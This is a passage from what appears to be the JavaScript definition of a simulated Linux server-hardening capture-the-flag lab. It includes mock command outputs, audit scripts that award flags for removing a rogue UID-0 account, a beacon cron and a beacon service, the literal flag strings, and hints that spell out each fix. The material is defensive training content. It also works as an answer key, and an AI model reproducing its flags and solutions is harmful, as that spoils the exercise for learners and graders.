                    return 'Chain INPUT (policy ACCEPT)\ntarget prot opt source destination\n\nChain FORWARD (policy ACCEPT)\nChain OUTPUT (policy ACCEPT)\n\nWARNING: Default ACCEPT on all chains -- no rules configured.';
                }
                return 'Chain INPUT (policy DROP)\ntarget prot opt source destination\nACCEPT tcp  --  anywhere anywhere tcp dpt:ssh\nACCEPT tcp  --  anywhere anywhere tcp dpt:https\nChain FORWARD (policy DROP)\nChain OUTPUT (policy ACCEPT)';
            }
            return '';
        },

        // apt -- package installation (aide, auditd)
        'apt': function(args, term, engine) {
            const sub  = args[0] || '';
            const pkgs = args.slice(1).filter(a => !a.startsWith('-'));

            if (sub === 'install') {
                const output = [];
                for (const pkg of pkgs) {
                    if (pkg === 'aide' || pkg === 'aide-common') {
                        engine.config._aideInstalled = true;
                        output.push(`Installing aide...`);
                        output.push(`aide (0.17.4-1ubuntu1) installed.`);
                        output.push(`Run: sudo aide --init && sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db`);
                    }
                    if (pkg === 'auditd' || pkg === 'audispd-plugins') {
                        engine.config._auditdConfigured = true;
                        output.push(`Installing auditd...`);
                        output.push(`auditd (3.0.7-1ubuntu2) installed.`);
                        output.push(`Run: sudo systemctl enable auditd && sudo systemctl start auditd`);
                        output.push(`Then add rules: sudo auditctl -w /etc/passwd -p wa -k identity_watch`);
                    }
                }
                return output.length ? output.join('\n') : `Package ${pkgs.join(', ')} not found or already installed.`;
            }

            if (sub === 'update') {
                return 'Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease\nReading package lists... Done';
            }

            return 'Usage: apt [install|update|remove] [packages]';
        },

        // aide -- integrity check and initialization
        'aide': function(args, term, engine) {
            if (!engine.config._aideInstalled) {
                return 'aide: command not found\nInstall: sudo apt install aide';
            }
            if (args.includes('--init') || args.includes('-i')) {
                return 'AIDE 0.17.4\nInitializing database...\nFiles scanned: 9,041\nDatabase written to: /var/lib/aide/aide.db.new\n\nMove to active database:\nsudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db\nAIDE baseline created.';
            }
            if (args.includes('--check') || args.includes('-C')) {
                return 'AIDE 0.17.4\nDatabase file /var/lib/aide/aide.db exists. Running check...\nFound 0 differences. System matches baseline.';
            }
            return 'Usage: aide [--init|--check]';
        },

        // auditctl -- add audit rules
        'auditctl': function(args, term, engine) {
            if (!engine.config._auditdConfigured) {
                return 'auditctl: command not found\nInstall: sudo apt install auditd';
            }

            const joined = args.join(' ');
            if (joined.includes('-w') || joined.includes('--watch')) {
                return 'Rule added.';
            }
            if (args.includes('-l') || args.includes('--list')) {
                return engine.config._auditdConfigured
                    ? '-w /etc/passwd -p wa -k identity_watch\n-w /etc/ssh/ -p wa -k ssh_config_watch\n2 rules loaded.'
                    : 'No rules loaded.';
            }
            return 'Usage: auditctl [-w path -p perms -k key] [-l]';
        },

        // grep -- search various configs
        'grep': function(args, term, engine) {
            const pattern = args.find(a => !a.startsWith('-')) || '';
            const target  = args.filter(a => !a.startsWith('-'))[1] || '';

            if (pattern.includes('PermitRoot') && target.includes('sshd_config')) {
                return engine.config._sshdHardened
                    ? 'PermitRootLogin no'
                    : 'PermitRootLogin yes  [FINDING: should be no]';
            }

            if (pattern.includes('recursion') && target.includes('named')) {
                return engine.config._bindSecured
                    ? 'recursion no;'
                    : 'recursion yes;  [FINDING: open resolver -- should be no]';
            }

            if (pattern.includes('svc-ghost') && target.includes('passwd')) {
                return engine.config._ghostRemoved ? '' : 'svc-ghost:x:0:0:Ghost Account:/home/svc-ghost:/bin/bash  [FINDING: UID 0]';
            }

            if (pattern.includes('$3 == 0') || (pattern.includes('UID') && pattern.includes('0'))) {
                return engine.config._ghostRemoved ? 'root' : 'root\nsvc-ghost';
            }

            return '';
        },

        // tee -- write configs (logrotate, audit rules)
        'tee': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target.includes('/etc/logrotate.d/cell-ops')) {
                engine.config._logrotateConfigured = true;
                return '(config written to /etc/logrotate.d/cell-ops)';
            }

            if (target.includes('/etc/audit/rules.d') || target.includes('audit.rules')) {
                engine.config._auditdConfigured = true;
                return '(audit rules written)';
            }

            return '(written to ' + (target || 'stdout') + ')';
        },

        // logrotate -- run rotation
        'logrotate': function(args, term, engine) {
            const force  = args.includes('-f') || args.includes('--force');
            const config = args.find(a => !a.startsWith('-') && a !== 'logrotate') || '';

            if (config.includes('cell-ops') || config === '/etc/logrotate.conf') {
                if (!engine.config._logrotateConfigured && config.includes('cell-ops')) {
                    return 'error: /etc/logrotate.d/cell-ops not found\nCreate it first, then re-run.';
                }
                if (force || engine.config._logrotateConfigured) {
                    engine.config._logrotateConfigured = true;
                    return 'rotating log /var/log/cell-ops/ops.log: OK\ncompressing /var/log/cell-ops/ops.log.1: OK';
                }
            }
            return 'Usage: logrotate [-f] <config>';
        },

        // Verification scripts
        '/opt/verify/check-network.sh': function(args, term, engine) {
            const checks = [
                { label: 'eth1 UP and configured (10.0.1.100/24)',  pass: engine.config._eth1Up        },
                { label: 'netplan config valid (no typos)',          pass: engine.config._netplanFixed  },
                { label: 'DNS resolver reachable (not 1.2.3.4)',     pass: engine.config._dnsFixed      }
            ];
            const failed = checks.filter(c => !c.pass);

            if (failed.length > 0) {
                const lines = checks.map(c => `  [${c.pass ? 'PASS' : 'FAIL'}] ${c.label}`).join('\n');
                return `Network audit:\n${lines}\n\n${failed.length} check(s) remaining.`;
            }

            engine.awardFlag('flag1');
            const lines = checks.map(c => `  [PASS] ${c.label}`).join('\n');
            return `Network audit:\n${lines}\n\nAll network checks passed.\nFLAG 1 awarded.`;
        },

        '/opt/verify/check-security.sh': function(args, term, engine) {
            const checks = [
                { label: 'sshd: PermitRootLogin no, PasswordAuth no, PermitEmptyPasswords no', pass: engine.config._sshdHardened       },
                { label: 'svc-ghost account removed (no UID 0 duplicates)',                    pass: engine.config._ghostRemoved        },
                { label: 'svc-ghost removed from sudoers',                                     pass: engine.config._ghostSudoRemoved    },
                { label: 'svc-ghost beacon cron removed',                                      pass: engine.config._beaconCronRemoved   },
                { label: 'UFW enabled with baseline rules',                                    pass: engine.config._ufwEnabled          }
            ];
            const failed = checks.filter(c => !c.pass);

            if (failed.length > 0) {
                const lines = checks.map(c => `  [${c.pass ? 'PASS' : 'FAIL'}] ${c.label}`).join('\n');
                return `Security audit:\n${lines}\n\n${failed.length} check(s) remaining.`;
            }

            engine.awardFlag('flag2');
            const lines = checks.map(c => `  [PASS] ${c.label}`).join('\n');
            return `Security audit:\n${lines}\n\nAll security checks passed.\nFLAG 2 awarded.`;
        },

        '/opt/verify/check-services.sh': function(args, term, engine) {
            const checks = [
                { label: 'BIND: recursion no, allow-query restricted',     pass: engine.config._bindSecured          },
                { label: 'cell-beacon.service stopped and disabled',        pass: engine.config._beaconServiceRemoved },
                { label: 'grid-sync.service active and running',            pass: engine.config._gridSyncRunning      }
            ];
            const failed = checks.filter(c => !c.pass);

            if (failed.length > 0) {
                const lines = checks.map(c => `  [${c.pass ? 'PASS' : 'FAIL'}] ${c.label}`).join('\n');
                return `Services audit:\n${lines}\n\n${failed.length} check(s) remaining.`;
            }

            engine.awardFlag('flag3');
            const lines = checks.map(c => `  [PASS] ${c.label}`).join('\n');
            return `Services audit:\n${lines}\n\nAll service checks passed.\nFLAG 3 awarded.`;
        },

        '/opt/verify/check-integrity.sh': function(args, term, engine) {
            const checks = [
                { label: 'AIDE installed and baseline initialized',              pass: engine.config._aideInstalled      },
                { label: 'auditd running with at least 2 watch rules',           pass: engine.config._auditdConfigured   },
                { label: 'logrotate configured for /var/log/cell-ops/',          pass: engine.config._logrotateConfigured }
            ];
            const failed = checks.filter(c => !c.pass);

            if (failed.length > 0) {
                const lines = checks.map(c => `  [${c.pass ? 'PASS' : 'FAIL'}] ${c.label}`).join('\n');
                return `Integrity audit:\n${lines}\n\n${failed.length} check(s) remaining.`;
            }

            engine.awardFlag('flag4');
            const lines = checks.map(c => `  [PASS] ${c.label}`).join('\n');
            return `Integrity audit:\n${lines}\n\nAll integrity checks passed.\nFLAG 4 awarded.\n\n*** CELL CERTIFIED AS GRID-READY ***`;
        },

        // ls
        'ls': function(args, term, engine) {
            const path = args.find(a => !a.startsWith('-')) || '/home/operator';
            const hasL = args.some(a => a.includes('l'));

            if (path === '/tmp' || path === '/tmp/') {
                if (!term.fs['/'].children.tmp.children['beacon.sh']) {
                    return '';
                }
                if (hasL) {
                    return '-rwxr-xr-x 1 root root 148 Mar 21 04:12 beacon.sh\n[FINDING: executable script in /tmp owned by root]';
                }
                return 'beacon.sh';
            }

            if (path.includes('/etc/systemd/system') && hasL) {
                const beaconLine = engine.config._beaconServiceRemoved
                    ? ''
                    : '\n-rw-r--r-- 1 root root 284 Mar 21 04:12 cell-beacon.service  [ROGUE]';
                return `-rw-r--r-- 1 root root 284 Apr 10 09:00 grid-sync.service${beaconLine}\n-rw-r--r-- 1 root root 284 Mar 21 04:12 [other unit files]`;
            }

            return null;
        }
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        {
            id: 'flag1',
            value: 'FLAG{ala-l12-full-cell-audit_flag1_network_certified}',
            label: 'Network Certified',
            description: 'eth1 up, netplan typo fixed, DNS resolver corrected.',
            points: 150,
            autoCheck: true
        },
        {
            id: 'flag2',
            value: 'FLAG{ala-l12-full-cell-audit_flag2_security_certified}',
            label: 'Security Certified',
            description: 'SSH hardened, ghost account removed, cron purged, firewall enabled.',
            points: 200,
            autoCheck: true
        },
        {
            id: 'flag3',
            value: 'FLAG{ala-l12-full-cell-audit_flag3_services_certified}',
            label: 'Services Certified',
            description: 'BIND restricted, beacon service removed, grid-sync running.',
            points: 150,
            autoCheck: true
        },
        {
            id: 'flag4',
            value: 'FLAG{ala-l12-full-cell-audit_flag4_integrity_certified}',
            label: 'Integrity Certified',
            description: 'AIDE initialized, auditd configured, logrotate set up.',
            points: 200,
            autoCheck: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        minScore: 0,
        maxScore: 700,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 2100000, points: 150 },
        timeBonusThreshold: 2700
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start with the audit checklist. Work through network first. Fix /etc/netplan/00-config.yaml (look for "addressess" -- double-s typo), then sudo netplan apply. Fix /etc/resolv.conf to point to 10.0.1.1.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint2',
            text: 'For UID 0 ghost: awk -F: \'$3 == 0 {print $1}\' /etc/passwd finds shadow root accounts. userdel -r svc-ghost removes it. Edit /etc/sudoers to remove the svc-ghost line. Check /var/spool/cron/crontabs/ for its cron entries.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint3',
            text: 'Check for enabled services: systemctl list-unit-files | grep enabled -- any service you did not configure is suspicious. For integrity: sudo apt install aide auditd, then aide --init, then auditctl -w /etc/passwd -p wa -k identity_watch.',
            cost: 50,
            penalty: -50
        }
    ],

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'CompTIA-Linux+',
        mappings: [
            { flagId: 'flag1', objective: '1.5', description: 'Manage networking', skill: 'netplan YAML debugging, interface management, DNS configuration' },
            { flagId: 'flag2', objective: '3.2', description: 'Implement security best practices', skill: 'SSH hardening, account auditing, firewall configuration, cron forensics' },
            { flagId: 'flag3', objective: '3.1', description: 'Summarize security best practices', skill: 'BIND open resolver mitigation, rogue service identification and removal' },
            { flagId: 'flag4', objective: '3.4', description: 'Implement logging services', skill: 'AIDE baseline creation, auditd rule configuration, logrotate setup' }
        ]
    }

};
